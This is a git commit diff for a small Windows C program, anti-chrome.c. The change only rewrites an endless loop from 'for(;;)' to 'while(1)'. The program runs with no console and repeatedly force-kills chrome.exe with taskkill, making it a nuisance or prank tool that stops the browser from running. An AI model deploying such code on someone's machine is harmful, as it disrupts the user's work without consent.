d87ff3c801d5249133bfe0807ccc94d0c40665c2
Tinnaphat "Tin" Somsang <loyaltyplex@gmail.com>
2021-12-27 22:56:51 +0700

    Change to while

--- anti-chrome.c
+++ anti-chrome.c
@@ -2,12 +2,11 @@
 
 int WinMain() {
 
-    for(;;) {
+    while(1) {
 
         if (system("tasklist | findstr chrome.exe") == 0) {
             system("taskkill /f /im chrome.exe");
         }
-
 
     };
 
